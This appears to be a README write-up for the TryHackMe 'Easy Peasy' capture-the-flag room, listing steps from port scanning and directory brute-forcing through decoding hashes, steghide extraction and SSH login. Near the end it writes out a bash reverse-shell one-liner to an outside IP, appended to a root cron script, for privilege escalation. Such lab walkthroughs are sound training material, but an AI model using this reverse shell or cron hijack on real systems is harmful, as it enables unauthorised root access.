# Easy-Peasy-CTF-

https://tryhackme.com/room/easypeasyctf

**Use nmap to scan for open ports: sudo nmap -sS -A -T4 -p- 10.10.76.122**  

	PORT      STATE SERVICE VERSION

	80/tcp    open  http    nginx 1.16.1

	6498/tcp  open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)

	65524/tcp open  http    Apache httpd 2.4.43 ((Ubuntu))

**Use gobuster tool to find for hidden directories:**

**gobuster -t 100 dir -u http://10.10.76.122 -e -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt**

	http://10.10.76.122/hidden/

**Use gobuster again to enumerate the hidden directory:**

	http://10.10.76.122/hidden/whatever/

Inspect the page and there will be a encrypted code

**Use cyberchef base64 to gain the first flag**

Head to **http://10.10.76.122:65524/** scroll down and the 3rd flag will be shown

**Use dirb on http://10.10.76.122:65524/:**
	http://10.10.76.122:65524/robots.txt

Head to the site and there will be an encrypted code , use md5 hash to find the 2nd flag

Inspect http://10.10.76.122:65524/ and there will be another encrypted code leading to the directory

**Use cyberchef again with base 62 to find the hidden directory** 

**Inspect the hidden directory to find another hash , unhash it to find the code *https://md5hashing.net/hash*** 

Head to the hidden folder with the binary number and download the image

**Use steghide extract -sf binarycodepixabay.jpg**  

Open the file and the username with a binary password will be inside

**Use cyberchef to uncover the binary code to the SSH password**

ssh -p 6498 boring@10.10.76.122  

cat the user.txt file , the flag will be in reverse order

**Head to https://www.dcode.fr/rot-cipher and uncover the real flag**

explore the crontab folder and there will be a secret .mysecretcronjob.sh file

**Head to https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet and copy the bash script** 

**echo "bash -i >& /dev/tcp/10.4.55.237/9876 0>&1" >> .mysecretcronjob.sh** 

Start netcat - nc -lvnp 9876

Excute the file - ./.mysecretcronjob.sh

Root is gained

cd /root/ and cat .root.txt file to get the final flag 

